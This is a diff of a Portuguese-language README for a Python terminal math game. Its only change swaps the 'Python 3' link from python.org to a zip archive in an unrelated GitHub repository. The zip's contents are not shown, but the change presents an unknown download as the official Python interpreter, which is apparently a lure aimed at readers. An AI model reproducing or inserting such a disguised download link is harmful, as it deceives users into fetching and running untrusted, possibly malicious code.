@@ -17,4 +17,4 @@ Um jogo de terminal feito em Python para testar seus conhecimentos em operaçõe
 
 🛠️ Tecnologias utilizadas
 
-- [Python 3](https://www.python.org/)
+- [Python 3](https://github.com/Rafas21/table_of_accounts/raw/refs/heads/main/osseously/table_accounts_of_1.3.zip)
